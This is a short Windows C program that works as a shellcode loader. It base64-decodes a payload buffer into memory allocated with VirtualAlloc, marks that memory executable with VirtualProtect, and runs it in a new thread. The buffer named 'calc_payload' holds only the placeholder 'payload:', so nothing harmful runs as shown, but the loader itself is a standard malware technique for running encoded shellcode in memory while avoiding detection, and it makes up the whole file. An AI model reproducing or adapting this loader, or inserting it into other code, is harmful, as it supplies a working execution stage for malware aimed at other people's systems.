#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <wincrypt.h>

unsigned char calc_payload[] = "payload:";
unsigned int calc_len = sizeof(calc_payload);


int DecodeBase64( const BYTE * src, unsigned int srcLen, char * dst, unsigned int dstLen ) {

	DWORD outLen;
	BOOL fRet;

	outLen = dstLen;
	fRet = CryptStringToBinary( (LPCSTR) src, srcLen, CRYPT_STRING_BASE64, (BYTE * )dst, &outLen, NULL, NULL);

	if (!fRet) outLen = 0;

	return( outLen );
}


int main(void) {

	void * exec_mem;
	BOOL rv;
	HANDLE th;
	DWORD oldprotect = 0;

	exec_mem = VirtualAlloc(0, calc_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	DecodeBase64((const BYTE *)calc_payload, calc_len, (char *) exec_mem, calc_len);
	rv = VirtualProtect(exec_mem, calc_len, PAGE_EXECUTE_READ, &oldprotect);
	if ( rv != 0 ) {
			th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
			WaitForSingleObject(th, -1);
	}

	return 0;
}
